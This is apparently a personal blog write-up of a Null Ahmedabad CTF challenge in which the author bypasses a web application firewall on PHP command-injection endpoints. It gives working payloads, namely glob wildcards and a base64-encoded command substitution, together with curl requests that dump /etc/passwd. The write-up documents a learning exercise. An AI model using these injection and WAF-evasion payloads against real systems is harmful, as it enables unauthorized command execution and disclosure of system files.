### Null Ahmedabad WAF Writeup
Hello there!
<br>
<br>
It is always a great experience with NullAhm.There was a wonderful CTF challenge made by @_x30r as a part of Null Monthly Meetup(26/4/2020).This is a documentation of my experience and my learning through this.So lets get right into this.
<br>
<br>

The Other day, I searched for WAF evasion techniques. Just to get a rough idea what it is like dealing with WAF.I came across some wonderfull stuff by @Menin_TheMiddle. Worth a read.
<br>
<a href="https://medium.com/@themiddleblue">https://medium.com/@themiddleblue</a>

Now moving on to the original CTF.Here's what it looks like.
<br>
<br>
![Branching](https://raw.githubusercontent.com/Auror007/Auror007.github.io/master/rawimg/b1mainpage.png)

<br>
Cool Banner :)
<br>
The line at the end says:
<br>
`Your aim is to get the contents of /etc/passwd using “cat” command only. Check /rce.php?cmd= and /rce1.php?cmd= but code for 1st challenge is available and can be easily solved!`
<br>
## rce1.php
Now lets try to do what it says with curl.
<br>
#### Request:
```bash
$ curl http://35.215.137.8/rce.php?cmd=
```
#### Response:
```bash
Print /etc/passwd contents via cat command only!
```
I tried to append "cat /etc/passwd" in the url.Didn't work. 
I tried to download that file using wget but it only contained the above response in written in that file :(

Lets try other things that were pointed by the hint given in Twitter Page of @NullAhm.It said that rce.php can be solved by the @Menin_TheMiddle articles.I had ~~read~~ skimmed through them. Now it was time to read it.This article focuses on wildcards also known as globbing patterns($man 7 glob).

<a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a>

#### Wildcard Table

| Pattern        | Description          |
|:-------------  |:------------------|
| *             | Match zero or more characters |
| ?             | Match any single character   |
| [...]         | Match any of the characters in a set    | 
| ?(patterns)   | Match zero or one occurrences of the patterns (extglob)| 
| *(patterns)   | Match zero or more occurrences of the patterns (extglob) | 
| +(patterns)   | Match one or more occurrences of the patterns (extglob) | 
| @(patterns)   |Match one occurrence of the patterns (extglob) | 
| !(patterns)   | Match anything that doesn't match one of the patterns (extglob) | 

<br>
<br>
Lets try wilcards.Some WAF may not filter such wildcards.
So, my payload was /bi?/ca?+/et?/passw? 
<br>
#### Request:
```bash
$ curl http://35.215.137.8/rce.php?cmd=/bi?/ca?+/et?/passw?
```
#### Response:
```bash
Print /etc/passwd contents via cat command only!
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```
Success! Now rce1.php won't be as easy as this.

<br>
#### Request:
```bash
$ curl http://35.215.137.8/rce1.php?cmd=/bi?/ca?+/et?/passw?
```
#### Response:
```bash
Noice..
Now print /etc/passwd contents via cat command only!
<br>/biopps?/caoops ?+/etoops ?/passwopps?</br>

```
After fuzzing various inputs, I realized that it is replacing the characters in the original command.I felt this as a dead end.But, there was a funny thought in my mind that made me do one more thing before giving up.It wasn't restricting normal alphabetic characters.So the first though came into my mind was base64 encoding.Hence, I entered following command in my terminal.

<br>
#### Terminal:
```bash
$echo "cat /etc/passwd" | base64 -      # '-' takes input file as output of previous echo. Same as $1.
Y2F0IC9ldGMvcGFzc3dkCg==
$ echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d  #-d for decode
cat /etc/passwd                         #yay! It outputs our payload command.
$ $(echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d )  #Instead of printing this will execute the above output.
```
<br>
Lets inject this in the rce1.php.
<br>
#### Request:
```bash
$ curl 'http://35.215.137.8/rce1.php?cmd=$(echo+Y2F0IC9ldGMvcGFzc3dkCg==+|+base64+-d+-)'
```
#### Response:
```bash
Print /etc/passwd contents via cat command only!<br>$(echo Y2F0IC9ldGMvcGFzc3dkCg== oops | base64 -d -)
<br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```
Success! Never thought this would ever work, but it did.I wanted to see where I got lucky.
$(echo Y2F0IC9ldGMvcGFzc3dkCg== oops | base64 -d -). Here all the + signs are converted to spaces as this string is parsed. And then base64 decoding uses blocks of 3 charcters to decode. It uses = or == as padding if one or two characters are remaining respectively to complete the count of 3.As the command decodes the string it does not care about the string "oops".Ctrl + x.Go to sleep.
<br>
Thank You for reading my first blog. 


